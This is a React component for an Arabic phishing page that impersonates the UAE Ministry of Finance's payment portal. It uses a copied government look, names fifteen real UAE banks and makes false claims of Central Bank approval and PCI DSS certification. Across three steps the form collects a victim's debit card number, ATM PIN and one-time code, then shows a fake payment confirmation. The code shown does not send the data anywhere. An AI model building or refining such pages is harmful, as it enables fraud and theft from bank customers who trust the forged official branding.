import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Shield, Lock as LockIcon, ArrowLeft, Eye, EyeOff, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// UAE Government Official Color Scheme
const uaeColors = {
  primary: "#CE1126", // UAE Red (Official)
  secondary: "#00732F", // UAE Green (Official)
  accent: "#000000", // Black (Official)
  background: "#FFFFFF", // White (Official)
  lightGray: "#F5F5F5", // Light Gray
  border: "#E0E0E0", // Border
  gold: "#b68a35", // MOF Gold (Official)
  goldHover: "#8f6c29", // MOF Gold Hover
};

// UAE Banks Data
const uaeBanks = [
  { id: 'adib', name: 'مصرف أبوظبي الإسلامي', nameEn: 'ADIB' },
  { id: 'ajman_bank', name: 'مصرف عجمان', nameEn: 'Ajman Bank' },
  { id: 'dubai_islamic', name: 'بنك دبي الإسلامي', nameEn: 'Dubai Islamic Bank' },
  { id: 'mashreq', name: 'بنك المشرق', nameEn: 'Mashreq Bank' },
  { id: 'sharjah_islamic', name: 'مصرف الشارقة الإسلامي', nameEn: 'Sharjah Islamic Bank' },
  { id: 'fab', name: 'بنك أبوظبي الأول', nameEn: 'FAB Bank' },
  { id: 'hsbc', name: 'بنك HSBC', nameEn: 'HSBC Bank' },
  { id: 'adcb', name: 'بنك أبوظبي التجاري', nameEn: 'ADCB Bank' },
  { id: 'rakbank', name: 'بنك رأس الخيمة الوطني', nameEn: 'RAKBANK' },
  { id: 'cbi', name: 'البنك التجاري الدولي', nameEn: 'CBI Bank' },
  { id: 'nbf', name: 'بنك الفجيرة الوطني', nameEn: 'NBF Bank' },
  { id: 'emirates_islamic', name: 'الإمارات الإسلامي', nameEn: 'Emirates Islamic Bank' },
  { id: 'nbd', name: 'بنك الإمارات دبي الوطني', nameEn: 'NBD Bank' },
  { id: 'cbd', name: 'بنك دبي التجاري', nameEn: 'Commercial Bank of Dubai' },
  { id: 'liv', name: 'بنك LIV', nameEn: 'LIV Bank' },
];

const PaymentUaeBankLogin = () => {
  const { bankId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [cardNumber, setCardNumber] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [step, setStep] = useState(1);

  const selectedBank = uaeBanks.find(bank => bank.id === bankId);

  const handleCardNumberSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (cardNumber.length < 16) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء إدخال رقم البطاقة المكون من 16 رقم",
        variant: "destructive",
      });
      return;
    }
    setStep(2);
  };

  const handlePinSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      toast({
        title: "رمز PIN غير صحيح",
        description: "الرجاء إدخال رمز PIN المكون من 4 أرقام",
        variant: "destructive",
      });
      return;
    }
    setStep(3);
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) {
      toast({
        title: "رمز التحقق غير صحيح",
        description: "الرجاء إدخال رمز التحقق المكون من 6 أرقام",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Get stored payment data
      const invoiceNumber = sessionStorage.getItem('paymentInvoiceNumber') || '';
      const paymentAmount = sessionStorage.getItem('paymentAmount') || '';

      toast({
        title: "تم تأكيد الدفع بنجاح",
        description: "سيتم توجيهك لإيصال الدفع",
      });

      // Navigate to receipt
      navigate(`/pay/uae/receipt?bank=${bankId}&invoice=${invoiceNumber}&amount=${paymentAmount}`);
    } catch (error) {
      toast({
        title: "خطأ في تأكيد الدفع",
        description: "حدث خطأ أثناء تأكيد الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!selectedBank) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4" style={{ color: uaeColors.primary }} />
          <h2 className="text-2xl font-bold mb-2" style={{ color: uaeColors.accent }}>البنك غير موجود</h2>
          <p className="text-gray-600 mb-6">الرجاء العودة واختيار بنك صحيح</p>
          <Button onClick={() => navigate('/pay/uae/bank-selector')} style={{ backgroundColor: uaeColors.primary }}>
            العودة لاختيار البنك
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.background }} dir="rtl">
      {/* Official UAE Government Header */}
      <div
        className="w-full border-b-4"
        style={{
          backgroundColor: uaeColors.background,
          borderBottomColor: uaeColors.primary
        }}
      >
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              {/* UAE Official Government Logo */}
              <div className="w-20 h-20 flex items-center justify-center">
                <svg width="80" height="80" viewBox="0 0 100 100" className="fill-current" style={{ color: uaeColors.primary }}>
                  <circle cx="50" cy="50" r="45" fill="white" stroke={uaeColors.primary} strokeWidth="3" />
                  <text x="50" y="45" textAnchor="middle" fontSize="18" fontWeight="bold" fill={uaeColors.primary} fontFamily="Noto Kufi Arabic">الإمارات</text>
                  <text x="50" y="60" textAnchor="middle" fontSize="14" fontWeight="bold" fill={uaeColors.secondary} fontFamily="Noto Kufi Arabic">UAE</text>
                </svg>
              </div>
              <div>
                <h1 className="text-2xl font-bold" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  البوابة الإلكترونية الموحدة للسداد
                </h1>
                <p className="text-sm" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  وزارة المالية - حكومة دولة الإمارات العربية المتحدة
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Badge variant="secondary" className="bg-white border-2" style={{ borderColor: uaeColors.gold, color: uaeColors.gold }}>
                <LockIcon className="w-4 h-4 ml-1" />
                <span style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>اتصال آمن ومشفر</span>
              </Badge>
            </div>
          </div>
        </div>
      </div>

      {/* Navigation Bar */}
      <div className="w-full" style={{ backgroundColor: uaeColors.lightGray }}>
        <div className="container mx-auto px-4 py-2">
          <div className="flex items-center gap-6">
            <a href="/pay/uae/bank-selector" className="text-sm font-semibold hover:underline" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              ← العودة
            </a>
            <a href="#" className="text-sm" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              الخدمات الإلكترونية
            </a>
            <a href="#" className="text-sm" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              حول دولة الإمارات
            </a>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto">
          {/* Official Header Banner */}
          <div className="mb-6 p-6 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
            <div className="flex items-center gap-4">
              <div
                className="w-20 h-20 rounded-full flex items-center justify-center"
                style={{ backgroundColor: uaeColors.secondary }}
              >
                <svg width="60" height="60" viewBox="0 0 100 100" className="text-white">
                  <text x="50" y="40" textAnchor="middle" fontSize="24" fontWeight="bold" fill="white" fontFamily="Noto Kufi Arabic">ع</text>
                  <text x="50" y="65" textAnchor="middle" fontSize="18" fill="white" fontFamily="Noto Kufi Arabic">دولة الإمارات</text>
                </svg>
              </div>
              <div>
                <h2 className="text-3xl font-bold mb-2" style={{ color: uaeColors.primary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  الخدمات المصرفية الإلكترونية
                </h2>
                <p className="text-lg" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  مرحباً بك في {selectedBank.name}
                </p>
              </div>
            </div>
          </div>

          {/* Bank Info Header */}
          <div className="bg-white rounded-lg shadow-xl border-2 overflow-hidden mb-6" style={{ borderColor: uaeColors.gold }}>
            <div
              className="p-8 border-b-2 text-center"
              style={{
                background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})`
              }}
            >
              <div className="flex items-center justify-center mb-4">
                <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                  <Building2 className="w-10 h-10" style={{ color: uaeColors.primary }} />
                </div>
              </div>
              <h3 className="text-2xl font-bold text-white mb-2" style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                تسجيل الدخول الآمن
              </h3>
              <p className="text-white opacity-90" style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                الرجاء إدخال بياناتك للمتابعة
              </p>
            </div>
            <div
              className="p-6"
              style={{ backgroundColor: `${uaeColors.gold}08` }}
            >
              <div className="text-center">
                <h4 className="text-xl font-bold mb-2" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  {selectedBank.name}
                </h4>
                <p className="text-sm" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  {selectedBank.nameEn}
                </p>
              </div>
            </div>
          </div>

          {/* Login Form */}
          <div className="bg-white rounded-lg shadow-xl border-2 overflow-hidden" style={{ borderColor: uaeColors.gold }}>
            <div className="p-8">
              {step === 1 && (
                <form onSubmit={handleCardNumberSubmit} className="space-y-6">
                  <div>
                    <Label
                      className="text-lg font-semibold block mb-3"
                      style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}
                    >
                      الخطوة 1: رقم بطاقة الخصم المباشر
                    </Label>
                    <p className="text-sm mb-4" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                      الرجاء إدخال رقم بطاقة الخصم المباشر المكون من 16 رقم
                    </p>
                    <Input
                      type="text"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
                      placeholder="#### #### #### ####"
                      className="h-14 text-lg border-2 rounded-lg px-4 transition-all tracking-widest font-mono"
                      style={{
                        borderColor: uaeColors.border,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                      maxLength={19}
                      required
                    />
                  </div>
                  <Button
                    type="submit"
                    className="w-full h-14 text-xl font-bold text-white transition-all hover:shadow-lg"
                    style={{
                      backgroundColor: uaeColors.gold,
                      fontFamily: 'Noto Kufi Arabic, sans-serif'
                    }}
                  >
                    متابعة
                  </Button>
                </form>
              )}

              {step === 2 && (
                <form onSubmit={handlePinSubmit} className="space-y-6">
                  <div>
                    <Label
                      className="text-lg font-semibold block mb-3"
                      style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}
                    >
                      الخطوة 2: رمز PIN
                    </Label>
                    <p className="text-sm mb-4" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                      الرجاء إدخال رمز PIN الخاص بأجهزة الصراف الآلي
                    </p>
                    <div className="relative">
                      <Input
                        type={showPin ? "text" : "password"}
                        value={pin}
                        onChange={(e) => setPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
                        placeholder="****"
                        className="h-14 text-lg border-2 rounded-lg px-4 text-center transition-all tracking-widest font-mono"
                        style={{
                          borderColor: uaeColors.border,
                          fontFamily: 'Noto Kufi Arabic, sans-serif'
                        }}
                        maxLength={4}
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPin(!showPin)}
                        className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                      >
                        {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <Button
                      type="button"
                      variant="outline"
                      className="flex-1 h-14 border-2"
                      style={{
                        borderColor: uaeColors.border,
                        color: uaeColors.accent,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                      onClick={() => setStep(1)}
                    >
                      رجوع
                    </Button>
                    <Button
                      type="submit"
                      className="flex-1 h-14 text-xl font-bold text-white transition-all hover:shadow-lg"
                      style={{
                        backgroundColor: uaeColors.gold,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                    >
                      متابعة
                    </Button>
                  </div>
                </form>
              )}

              {step === 3 && (
                <form onSubmit={handleOtpSubmit} className="space-y-6">
                  <div>
                    <Label
                      className="text-lg font-semibold block mb-3"
                      style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}
                    >
                      الخطوة 3: رمز التحقق
                    </Label>
                    <p className="text-sm mb-4" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                      تم إرسال رمز التحقق إلى هاتفك المسجل في البنك
                    </p>
                    <Input
                      type="text"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      placeholder="******"
                      className="h-14 text-lg border-2 rounded-lg px-4 text-center transition-all tracking-widest font-mono"
                      style={{
                        borderColor: uaeColors.border,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                      maxLength={6}
                      required
                    />
                  </div>
                  <div className="flex gap-3">
                    <Button
                      type="button"
                      variant="outline"
                      className="flex-1 h-14 border-2"
                      style={{
                        borderColor: uaeColors.border,
                        color: uaeColors.accent,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                      onClick={() => setStep(2)}
                    >
                      رجوع
                    </Button>
                    <Button
                      type="submit"
                      className="flex-1 h-14 text-xl font-bold text-white transition-all hover:shadow-lg"
                      style={{
                        backgroundColor: uaeColors.gold,
                        fontFamily: 'Noto Kufi Arabic, sans-serif'
                      }}
                      disabled={isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white ml-2"></div>
                          <span>جاري التأكيد...</span>
                        </>
                      ) : (
                        'تأكيد الدفع'
                      )}
                    </Button>
                  </div>
                </form>
              )}
            </div>
          </div>

          {/* Security Notice */}
          <div
            className="rounded-lg p-6 border-2 mb-6 mt-6"
            style={{ backgroundColor: `${uaeColors.secondary}08`, borderColor: uaeColors.secondary }}
          >
            <div className="flex items-start gap-4">
              <div
                className="w-12 h-12 rounded-full flex items-center justify-center"
                style={{ backgroundColor: uaeColors.secondary }}
              >
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div className="flex-1">
                <h4 className="text-lg font-bold mb-2" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  دفع آمن ومشفر 256-bit SSL
                </h4>
                <p className="text-sm mb-2" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  جميع المعاملات محمية بأعلى معايير الأمان العالمية
                </p>
                <div className="flex items-center gap-4 text-xs" style={{ color: uaeColors.gold }}>
                  <span>✓ معتمد من المصرف المركزي الإمارات</span>
                  <span>✓ مشفر بتقنية TLS 1.3</span>
                  <span>✓ متوافق مع PCI DSS</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Official Government Footer */}
      <div className="mt-8 p-6 rounded-lg text-center" style={{ backgroundColor: uaeColors.lightGray }}>
        <div className="flex items-center justify-center gap-6 mb-4">
          <div className="text-center">
            <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.primary }}>
              <Shield className="w-8 h-8 text-white" />
            </div>
            <p className="text-xs font-semibold" style={{ color: uaeColors.primary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              المصرف المركزي الإمارات
            </p>
          </div>
          <div className="text-center">
            <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.gold }}>
              <LockIcon className="w-8 h-8 text-white" />
            </div>
            <p className="text-xs font-semibold" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              PCI DSS Certified
            </p>
          </div>
          <div className="text-center">
            <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.secondary }}>
              <Building2 className="w-8 h-8 text-white" />
            </div>
            <p className="text-xs font-semibold" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              وزارة المالية
            </p>
          </div>
        </div>
        <p className="text-sm font-semibold" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
          جميع الحقوق محفوظة © 2025 حكومة دولة الإمارات العربية المتحدة
        </p>
        <p className="text-xs mt-2" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
          البوابة الإلكترونية الموحدة للخدمات الحكومية - وزارة المالية
        </p>
      </div>
    </div>
  );
};

export default PaymentUaeBankLogin;
